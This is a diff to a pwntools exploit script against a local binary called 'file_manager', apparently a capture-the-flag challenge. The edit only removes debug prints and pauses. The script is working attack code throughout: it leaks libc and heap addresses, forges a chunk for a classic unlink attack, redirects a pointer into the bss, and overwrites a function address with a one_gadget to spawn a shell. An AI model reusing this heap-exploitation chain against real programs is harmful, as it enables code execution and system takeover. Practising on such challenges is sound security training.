@@ -1,5 +1,5 @@
 from pwn import *
-
+import time
 context.log_level = 'debug'
 p = process("./file_manager")
 
@@ -57,7 +57,6 @@ create("afang", 0x100, "aaa") #3
 edit("3", "a"*7)
 data = viewfile("3")
 libc = u64(data.split("\n")[2].ljust(8,"\x00")) - 0x3c4b78
-print hex(libc)
 chunk = 0x602628 #7 ptr.
 delete("0")
 delete("3")
@@ -65,13 +64,11 @@ create("afang", 0x100, "a"*7 + "\x00") #0
 edit("0","a"*7)
 data = viewfile("0")
 heap = u64(data.split("\n")[2].ljust(8,"\x00")) - 0x3f0
-print hex(heap)
 create("afang", 0x100, "a"*40+"\x00") #3
 create("afang", 0x100, "a"*40+"\x00") #5
 create("afang", 0x100, "a"*40+"\x00") #6
 create("afang", 0x100, "a"*40+"\x00") #7
 
-raw_input("how many?")
 #start the unlink exploit:
 create("afang", 0x28, "a"*8+"\x00")  #8, malloc 0x28 and then free it will reside in fastbin. And the next two title will be saved inside here
 #&& the next two contents will be adjacent. This is the classic unlink attack scene. 
@@ -83,17 +80,13 @@ delete("8")
 #raw_input("here.")
 create("afang", 0xf8, "x"*8) #overflow to #9 title size bit, fake wrong title size.
 #raw_input("here.")
-raw_input("here.")
 edit("8", p64(0x0) + p64(0xf1) + p64(chunk-0x18) + p64(chunk-0x10) + "a"*0xd0 + p64(0xf0),i=1)
-raw_input("before unlink.")
 #unlink trigger!
 delete("9")
-raw_input("check bss.")
 
 one_gadget = libc + 0xf1147 
 #and now index 7 is pointing to the bss.
 edit("8", p64(0x1)+p64(0x602030))
-raw_input("stop.")
 edit("7", p64(one_gadget),i=1,d=1)
 p.interactive()
 
